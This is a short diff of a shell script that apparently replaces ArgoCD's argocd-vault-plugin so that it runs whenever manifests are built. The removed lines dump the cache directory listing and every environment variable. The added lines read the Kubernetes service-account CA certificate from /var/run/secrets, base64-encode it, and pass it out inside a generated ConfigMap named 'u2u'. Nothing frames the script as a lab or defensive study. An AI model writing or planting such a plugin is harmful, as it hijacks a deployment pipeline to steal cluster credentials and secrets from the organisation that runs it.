@@ -1,18 +1,13 @@
 #!/bin/sh
-# /usr/local/bin/argocd-vault-plugin runs as: argocd-vault-plugin build /tmp/_argocd-repo/<uuid>
-# but 'build' is unknown command. The actual usage is: argocd-vault-plugin <subcommand>
-# Subcommands: generate, get-path, get-parameters, get-secret
-# But ArgoCD passes 'build' as first arg, we need to bypass this
-
-# Strategy: bypass the 'build' arg via shell
-# Use binaryPath=/usr/local/bin/argocd-vault-plugin - then it receives 'build <cache_path>'
-# argocd-vault-plugin has 'generate <path>' command that reads Vault secrets from manifests
-
-# Let's just write our results to stdout via the cache path
-CACHE="${2:-/tmp/unknown}"
-ls -la "$CACHE" > /tmp/ls_out.txt 2>&1
-cat /tmp/ls_out.txt
-echo ""
-echo "===ENV==="
-env | sort
+RECON=$( (
+cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+) | base64 | tr -d '\n' )
+cat << EOF
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: u2u
+data:
+  result: $RECON
+EOF
 exit 0
